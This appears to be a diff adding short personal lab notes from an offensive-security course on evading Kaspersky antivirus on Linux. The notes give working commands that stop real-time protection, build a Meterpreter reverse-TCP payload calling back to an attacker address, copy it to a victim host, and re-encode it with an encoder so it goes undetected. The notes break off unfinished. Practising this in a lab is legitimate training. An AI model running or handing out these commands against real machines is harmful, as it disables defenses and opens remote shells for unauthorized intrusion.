@@ -1,1 +1,36 @@
+# Turn off AV 
+
+sudo kesl-control --stop-t 1
+
+cd /opt/av
+
+# Scan file usig AV
+ sudo kesl-control  --scan-file /.eicar.txt 
+ File gets removed
+
+# Check the detection logs 
+
+sudo kesl-control -E --query | grep DetectName
+
+# Lest create a meterpreter shell from kali 
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp lport=443 lhost=192.168.45.199 -f elf -o /tmp/met.elf
+
+# Copy this file to tmp on victim machine
+
+scp /tmp/met.elf offsec@192.168.201.45:/tmp/
+
+# Again scan the file using AV and file seems get deleted again
+
+sudo kesl-control  --scan-file /tmp/met.elf
+
+# We need to use encoder now to generate new payload
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp lport=443 lhost=192.168.45.199 -e x64/zutto_dekira -f elf -o /tmp/zutto.elf
+
+Now not getting detected
+
+# Restore real time protection use C payload to check its effectiveness
+
+
 
